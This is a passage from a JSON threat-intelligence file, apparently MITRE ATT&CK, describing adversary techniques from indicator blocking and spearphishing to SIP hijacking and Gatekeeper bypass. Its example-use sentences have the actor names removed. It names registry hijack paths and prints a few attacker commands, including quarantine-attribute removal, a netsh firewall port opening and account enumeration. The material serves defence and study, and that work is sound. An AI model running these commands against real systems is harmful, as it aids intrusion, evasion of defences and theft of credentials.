    "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include modifying sensor settings stored in configuration files and/or Registry keys to disable or maliciously redirect event telemetry. (Citation: Microsoft Lamin Sept 2017)\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.",
    "example_uses": [],
    "id": "T1054",
    "name": "Indicator Blocking",
    "similar_words": [
      "Indicator Blocking"
    ]
  },
  "attack-pattern--6aabc5ec-eae6-422c-8311-38d45ee9838a": {
    "description": "Adversaries may use more than one remote access tool with varying command and control protocols as a hedge against detection. If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network. (Citation: Mandiant APT1)\n\nUse of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server.",
    "example_uses": [
      "used a tool called Imecab to set up a persistent remote access account on the victim machine.",
      "has used TeamViewer to preserve remote access in case control using the Cobalt Strike module was lost.",
      "has been known to use multiple backdoors per campaign.",
      "has used  via Web shell to establish redundant access. The group has also used harvested credentials to gain access to Internet-accessible resources such as Outlook Web Access, which could be used for redundant access.",
      "maintains access to victim environments by using  to access  as well as establishing a backup RDP tunnel by using .",
      "will sleep until after a date/time value loaded from a .dat file has passed. This allows the RAT to remain dormant until a set date, which could allow a means to regain access if other parts of the actors' toolset are removed from a victim.",
      "has deployed backup web shells and obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network."
    ],
    "id": "T1108",
    "name": "Redundant Access",
    "similar_words": [
      "Redundant Access"
    ]
  },
  "attack-pattern--6aac77c4-eaf2-4366-8c13-ce50ab951f38": {
    "description": "Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
    "example_uses": [
      "sends emails to victims with a malicious executable disguised as a document or spreadsheet displaying a fake icon.",
      "has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the “attachedTemplate” technique to load a template from a remote server.",
      "sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.",
      "sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.",
      "sent emails to victims with malicious Microsoft Office documents attached.",
      "used spearphishing with Microsoft Office attachments to target victims.",
      "has targeted victims with spearphishing emails containing malicious Microsoft Word documents.",
      "has attached a malicious document to an email to gain initial access.",
      "used spearphishing emails with malicious Microsoft Word attachments to infect victims.",
      "has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.",
      "has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables.",
      "delivers malware using spearphishing emails with malicious HWP attachments.",
      "sent spearphishing emails containing malicious Microsoft Office attachments.",
      "has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.",
      "has used spearphishing with an attachment to deliver files with exploits to initial victims.",
      "has used spearphishing with an attachment to deliver files with exploits to initial victims.",
      "has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files.",
      "has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.",
      "has sent spearphishing emails with attachments to victims as its primary initial access vector.",
      "has distributed targeted emails containing Word documents with embedded malicious macros.",
      "sent malicious attachments to victims over email, including an Excel spreadsheet containing macros to download Pupy.",
      "has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.",
      "has targeted victims using spearphishing emails with malicious Microsoft Word attachments."
    ],
    "id": "T1193",
    "name": "Spearphishing Attachment",
    "similar_words": [
      "Spearphishing Attachment"
    ]
  },
  "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5": {
    "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming) When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide) Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through kextload and kextunload commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
    "example_uses": [],
    "id": "T1215",
    "name": "Kernel Modules and Extensions",
    "similar_words": [
      "Kernel Modules and Extensions"
    ]
  },
  "attack-pattern--6c174520-beea-43d9-aac6-28fb77f3e446": {
    "description": "Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\n (Citation: Graeber 2014)",
    "example_uses": [
      "Install-SSP Persistence module can be used to establish by installing a SSP DLL.",
      "The  credential dumper contains an implementation of an SSP."
    ],
    "id": "T1101",
    "name": "Security Support Provider",
    "similar_words": [
      "Security Support Provider"
    ]
  },
  "attack-pattern--6e6845c2-347a-4a6f-a2d1-b74a18ebd352": {
    "description": "The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem)\n\nAdversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., [DLL Side-Loading](https://attack.mitre.org/techniques/T1073) or [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038)), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.",
    "example_uses": [
      "establishes by infecting the Security Accounts Manager (SAM) DLL to load a malicious DLL dropped to disk.",
      "drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes."
    ],
    "id": "T1177",
    "name": "LSASS Driver",
    "similar_words": [
      "LSASS Driver"
    ]
  },
  "attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf": {
    "description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)",
    "example_uses": [
      "captures images from the webcam.",
      "created a custom video recording capability that could be used to monitor operations in the victim's environment.",
      "has modules that are capable of capturing from a victim's webcam.",
      "has the capability to access the webcam on the victim’s machine.",
      "can perform webcam viewing.",
      "can remotely activate the victim’s webcam to capture content.",
      "can access a connected webcam and capture pictures.",
      "is capable of capturing video.",
      "has the capability to capture video from a victim machine.",
      "uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\\Intel\\Skype."
    ],
    "id": "T1125",
    "name": "Video Capture",
    "similar_words": [
      "Video Capture"
    ]
  },
  "attack-pattern--6fb6408c-0db3-41d9-a3a1-a32e5f16454e": {
    "description": "In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called com.apple.quarantine. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. \n\nApps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag. Additionally, other utilities or events like drive-by downloads don’t necessarily set it either. This completely bypasses the built-in Gatekeeper check. (Citation: Methods of Mac Malware Persistence) The presence of the quarantine flag can be checked by the xattr command xattr /path/to/MyApp.app for com.apple.quarantine. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app. (Citation: Clearing quarantine attribute) (Citation: OceanLotus for OS X)\n \nIn typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper)",
    "example_uses": [],
    "id": "T1144",
    "name": "Gatekeeper Bypass",
    "similar_words": [
      "Gatekeeper Bypass"
    ]
  },
  "attack-pattern--6ff403bc-93e3-48be-8687-e102fdba8c88": {
    "description": "Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.\n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.",
    "example_uses": [
      "has used UPX to pack ",
      "uses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2.",
      "leverages a custom packer to obfuscate its functionality.",
      "is initially packed.",
      "packs a plugin with UPX.",
      "has packed malware payloads before delivery to victims.",
      "A  variant uses a custom packer.",
      "Some  DLL files have been packed with UPX.",
      "has been known to pack their tools.",
      "A version of  uses the MPRESS packer.",
      "uses a custom packing algorithm.",
      "uses a custom packer.",
      "has been packed with the UPX packer.",
      "samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.",
      "packed an executable by base64 encoding the PE file and breaking it up into numerous lines.",
      "A  payload was packed with UPX.",
      "used UPX to pack files.",
      "is known to use software packing in its tools."
    ],
    "id": "T1045",
    "name": "Software Packing",
    "similar_words": [
      "Software Packing"
    ]
  },
  "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0": {
    "description": "Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).",
    "example_uses": [
      "used batch scripts to enumerate network information, including information about trusts, zones, and the domain.",
      "gathers the Mac address, IP address, and the network adapter information from the victim’s machine.",
      "has the capability to gather the IP address from the victim's machine.",
      "gathers informatin on the IP forwarding table, MAC address, and network SSID.",
      "uses the ipconfig /all command to gather the victim’s IP address.",
      "can gather the IP address from the victim's machine.",
      "runs ipconfig /all and collects the domain name.",
      "gathers information about network adapters.",
      "gathers the local IP address.",
      "used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.",
      "gathers network configuration information as well as the ARP cache.",
      "can execute ipconfig on the victim’s machine.",
      "collects information about the Internet adapter configuration.",
      "collects the victim IP address, MAC address, as well as the victim account domain name.",
      "uses the ipconfig command.",
      "collects the network adapter information.",
      "collects network adapter and interface information by using the commands ipconfig /all, arp -a and route print. It also collects the system's MAC address with getmac and domain configuration with net config workstation.",
      "uses ipconfig /all and route PRINT to identify network adapter and interface information.",
      "can retrieve information about the Windows domain.",
      "runs the ifconfig command to obtain the IP address from the victim’s machine.",
      "collects the network adapter information and domain/username information based on current remote sessions.",
      "obtains the IP address from the victim’s machine.",
      "will look for the current IP address.",
      "gathers the IP address and domain from the victim’s machine.",
      "gathers the victim’s IP address via the ipconfig -all command.",
      "has the capability to gather the victim's proxy information.",
      "gathers the MAC address of the victim’s machine.",
      "gathers the current domain the victim system belongs to.",
      "can gather information about the victim proxy server.",
      "can obtain network information, including DNS, IP, and proxies.",
      "A  variant gathers network interface card information.",
      "creates a backdoor through which remote attackers can retrieve IP addresses of compromised machines.",
      "gathers the victim's IP address and domain information, and then sends it to its C2 server.",
      "can retrieve IP and network adapter configuration information from compromised hosts.",
      "collects the domain name from a compromised host.",
      "has built in commands to identify a host’s IP address and find out other network configuration settings by viewing connected sessions.",
      "can gather victim proxy information.",
      "malware gathers the victim's local IP address, MAC address, and external IP address.",
      "collects the victim LAN IP address and sends it to the C2 server.",
      "discovers the current domain information.",
      "collects MAC address and local IP address information from the victim.",
      "collects the victim's IP address.",
      "may collect network configuration data by running ipconfig /all on a victim.",
      "has run ipconfig /all on a victim.",
      "collects the network adapter’s IP and MAC address as well as IP addresses of the network adapter’s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file.",
      "has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.",
      "A module in  collects information from the victim about its IP addresses and MAC addresses.",
      "has the capability to execute the command ipconfig /all.",
      "has gathered information about network IP configurations using .exe and about routing tables using .exe.",
      "can be used to display ARP configuration information on the host.",
      "has a command to get the victim's domain and NetBIOS name.",
      "contains a command to collect the victim MAC address and LAN IP.",
      "collects information on network settings and Internet proxy settings from the victim.",
      "actors use nbtscan to discover vulnerable systems.",
      "can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.",
      "collects the local IP address of the victim and sends it to the C2.",
      "may create a file containing the results of the command cmd.exe /c ipconfig /all.",
      "executes ipconfig /all after initial communication is made to the remote server.",
      "has a command to collect the victim's IP address.",
      "can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.",
      "can be used to discover local NetBIOS domain names.",
      "gathers and beacons the MAC and IP addresses during installation.",
      "obtains the victim IP address.",
      "The reconnaissance modules used with  can collect information on network configuration.",
      "can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP.",
      "can be used to discover routing configuration information.",
      "can obtain information about the victim's IP address.",
      "may use ipconfig /all to gather system network configuration details.",
      "obtains the target's IP address and local network segment.",
      "can obtain information about network parameters.",
      "malware gathers the Address Resolution Protocol (ARP) table from the victim.",
      "malware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.",
      "A keylogging tool used by  gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.",
      "uses commands such as netsh interface show to discover network interface settings.",
      "actors used the following command after exploiting a machine with  malware to acquire information about local networks: ipconfig /all >> %temp%\\download",
      "surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, and net config commands.",
      "performs local network configuration discovery using ipconfig."
    ],
    "id": "T1016",
    "name": "System Network Configuration Discovery",
    "similar_words": [
      "System Network Configuration Discovery"
    ]
  },
  "attack-pattern--72b5ef57-325c-411b-93ca-a3ca6fa17e31": {
    "description": "In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1116), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and whitelisting tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n\n* Modifying the Dll and FuncName Registry values in HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID} that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the Dll and FuncName Registry values in HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID} that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the DLL and Function Registry values in HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID} that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",
    "example_uses": [],
    "id": "T1198",
    "name": "SIP and Trust Provider Hijacking",
    "similar_words": [
      "SIP and Trust Provider Hijacking"
    ]
  },
  "attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08": {
    "description": "Adversaries may attempt to get a listing of local system or domain accounts. \n\n### Windows\n\nExample commands that can acquire this information are net user, net group <groupname>, and net localgroup <groupname> using the [Net](https://attack.mitre.org/software/S0039) utility or through use of [dsquery](https://attack.mitre.org/software/S0105). If adversaries attempt to identify the primary user, currently logged in user, or set of users that commonly uses a system, [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) may apply.\n\n### Mac\n\nOn Mac, groups can be enumerated through the groups and id commands. In mac specifically, dscl . list /Groups and dscacheutil -q group can also be used to enumerate groups and users.\n\n### Linux\n\nOn Linux, local users can be enumerated through the use of the /etc/passwd file which is world readable. In mac, this same file is only used in single-user mode in addition to the /etc/master.passwd file.\n\nAlso, groups can be enumerated through the groups and id commands.",
    "example_uses": [
      "gathers information on local groups and members on the victim’s machine.",
      "has a command to list account information on the victim’s machine.",
      "gathers domain and account names/information through process monitoring.",
      "collects the users of the system.",
      "uses the net user command.",
      "collects a list of accounts with the command net users.",
      "uses the net user command.",
      "used batch scripts to enumerate users in the victim environment.",
      "Get-ProcessTokenGroup Privesc-PowerUp module can enumerate all SIDs associated with its current token.",
      "has the capability to retrieve information about users on remote hosts.",
      "uses PowerView and Pywerview to perform discovery commands such as net user, net group, net local group, etc.",
      "can retrieve usernames from compromised hosts.",
      "has run net user, net user /domain, net group “domain admins” /domain, and net group “Exchange Trusted Subsystem” /domain to get account listings on a victim.",
      "enumerates local and domain users",
      "has used net user /domain to identify account information.",
      "may collect user account information by running net user /domain or a series of other commands on a victim.",
      "has used the Microsoft administration tool csvde.exe to export Active Directory data.",
      "may create a file containing the results of the command cmd.exe /c net user {Username}.",
      "may use net group \"domain admins\" /domain to display accounts in the \"domain admins\" permissions group and net localgroup \"administrators\" to list local system administrator group membership.",
      "runs the command net user on a victim.  also runs tests to determine the privilege level of the compromised user.",
      "can obtain a list of users.",
      "has used net user to conduct internal discovery of systems.",
      "The discovery modules used with  can collect information on accounts and permissions.",
      "has a command to retrieve information about connected users.",
      "executes net user after initial communication is made to the remote server.",
      "collects information on local user accounts from the victim.",
      "Commands under net user can be used in  to gather information about and manipulate user accounts.",
      "can be used to gather information on user accounts within a domain.",
      "has used Metasploit’s  NTDSGRAB module to obtain a copy of the victim's Active Directory database.",
      "searches for administrator accounts on both the local victim machine and the network.",
      "has used a tool that can obtain info about local and global group users, power users, and administrators.",
      "actors used the following commands following exploitation of a machine with  malware to enumerate user accounts: net user >> %temp%\\download net user /domain >> %temp%\\download",
      "performs account discovery using commands such as net localgroup administrators and net group \"REDACTED\" /domain on specific permissions groups."
    ],
    "id": "T1087",
    "name": "Account Discovery",
    "similar_words": [
      "Account Discovery"
    ]
  },
  "attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea": {
    "description": "A connection proxy is used to direct network traffic between systems or act as an intermediary for network communications. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools)\n\nThe definition of a proxy can also be expanded out to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.\n\nThe network may be within a single organization or across organizations with trust relationships. Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.",
    "example_uses": [
      "An  downloader establishes SOCKS5 connections for its initial C2.",
      "functions as a proxy server between the victim and C2 server.",
      "can start SOCKS proxy threads.",
      "can function as a proxy to create a serve that relays communication between the client and C&C server.",
      "can communicate over a reverse proxy using SOCKS5.",
      "uses the command cmd.exe /c netsh firewall add portopening TCP 443 \"adp\" and makes the victim machine function as a proxy server.",
      "A  variant can force the compromised system to function as a proxy server.",
      "has connected to C2 servers through proxies.",
      "is capable of tunneling though a proxy.",
      "uses multiple proxies to obfuscate network traffic from victims.",
      "is a simple proxy that creates an outbound RDP connection.",
      "identifies a proxy server if it exists and uses it to make HTTP requests.",
      "used a proxy server between victims and the C2 server.",
      "The \"ZJ\" variant of  allows \"ZJ link\" infections with Internet access to relay traffic from \"ZJ listen\" to a command server.",
      "has used a global service provider's IP as a proxy for C2 traffic from a victim.",
      "can be configured to have commands relayed over a peer-to-peer network of infected hosts if some of the hosts do not have Internet access.",
      "can be used to set up a proxy tunnel to allow remote host access to an infected host.",
      "is used for proxying connections to obfuscate command and control infrastructure.",
      "leveraged several compromised universities as proxies to obscure its origin.",
      "relays traffic between a C2 server and a victim.",
      "can be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points, or provide access to a host without direct internet access.",
      "supports peer connections.",
      "has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.",
      "used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router.  has also used a machine to relay and obscure communications between  and their server."
    ],
    "id": "T1090",
    "name": "Connection Proxy",
    "similar_words": [
      "Connection Proxy"
    ]
  },
  "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830": {
    "description": "Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).\n\nAdversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.",
    "example_uses": [
      "uses cmd.exe to execute commands.",
      "executes commands remotely on the infected host.",
      "executes a binary on the system and logs the results into a temp file by using: cmd.exe /c \"<file_path> > %temp%\\PM* .tmp 2>&1\".",
      "uses the command prompt to execute commands on the victim's machine.",
      "Several commands are supported by the 's implant via the command-line interface and there’s also a utility to execute any custom command on an infected endpoint.",
      "can launch a remote shell to execute commands on the victim’s machine.",
      "has used cmd.exe to execute commmands.",
      "can launch cmd.exe to execute commands on the system.",
      "opens a remote shell to execute commands on the infected system.",
      "used command line for execution.",
      "malware can use cmd.exe to download and execute payloads and to execute commands on the system.",
      "is capable of spawning a Windows command shell.",
      "launches a shell to execute commands on the victim’s machine.",
      "uses the command-line interface to execute arbitrary commands.",
      "uses cmd.exe and /bin/bash to execute commands on the victim’s machine.",
      "has the capability to execute commands using cmd.exe.",
      "can execute shell commands using cmd.exe.",
      "used cmd.exe to launch commands on the victim’s machine.",
      "creates a backdoor through which remote attackers can open a command-line interface.",
      "uses cmd.exe to execute commands on the victim’s machine.",
      "uses cmd.exe to execute commands on the victim’s machine.",
      "uses cmd.exe to execute commands for discovery.",
      "can open an interactive command-shell to perform command line functions on victim machines.",
      "can execute commands using a shell.",
      "uses cmd.exe to execute netshcommands.",
      "has a command to create a reverse shell.",
      "can launch a remote shell to execute commands.",
      "uses cmd.exe to execute commands on the victim’s machine.",
      "uses cmd.exe to execute scripts and commands on the victim’s machine.",
      "uses a command prompt to run a PowerShell script from Excel.",
      "uses cmd.exe to execute commands.",
      "executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.",
      "leverages cmd.exe to perform discovery techniques.",
      "executes commands remotely via cmd.exe.",
      "uses a command-line interface.",
      "can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.",
      "uses a backdoor known as BADFLICK that is is capable of generating a reverse shell.",
      "has used the command-line interface.",
      "can spawn remote shells.",
      "can use the command-line utility cacls.exe to change file permissions.",
      "creates a backdoor through which remote attackers can open a command line interface.",
      "provides access using both standard facilities like SSH and additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet",
      "provides a reverse shell connection on 8338/TCP, encrypted via AES.",
      "creates a backdoor through which remote attackers can start a remote shell.",
      "can run a copy of cmd.exe.",
      "can execute shell commands.",
      "uses the command-line interface.",
      "is capable of creating a reverse shell.",
      "uses the command-line interface.",
      "uses a command-line interface to interact with systems.",
      "can execute commands from its C2 server.",
      "provides a reverse shell on the victim.",
      "has used the command-line interface.",
      "uses command line for execution.",
      "uses the command line.",
      "is capable of providing Meterpreter shell access.",
      "can execute commands on victims.",
      "can execute shell commands.",
      "can execute commands on the victim's machine.",
      "has used the command-line interface for execution.",
      "has used command line during its intrusions.",
      "can provide a remote shell.",
      "has used command-line interfaces for execution.",
      "can execute commands on the victim.",
      "is capable of executing commands and spawning a reverse shell.",
      "can receive and execute commands with cmd.exe. It can also provide a reverse shell.",
      "can create a remote shell and run a given command.",
      "is capable of performing remote command execution.",
      "Adversaries can direct  to execute from the command-line on infected hosts, or have  create a reverse shell.",
      "has the capability to create a remote shell.",
      "is capable of creating a remote Bash shell and executing commands.",
      "is capable of executing commands via cmd.exe.",
      "allows adversaries to execute shell commands on the infected host.",
      "has the capability to create a reverse shell on victims.",
      "is capable of executing commands.",
      "has the ability to create a reverse shell.",
      "executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands.",
      "A module in  allows arbitrary commands to be executed by invoking C:\\Windows\\System32\\cmd.exe.",
      "is capable of creating a reverse shell.",
      "has the capability to create a reverse shell.",
      "can execute commands using cmd.exe.",
      "has the capability to create a remote shell and execute specified commands.",
      "uses cmd.exe to run commands for enumerating the host.",
      "provides command-line access to the compromised system.",
      "is capable of opening a command terminal.",
      "is capable of creating reverse shell.",
      "uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.",
      "is capable of providing shell functionality to the attacker to execute commands.",
      "kills and disables services by using cmd.exe.",
      "can execute commands via an interactive command shell.",
      "calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup.  also has the capability to invoke a reverse shell.",
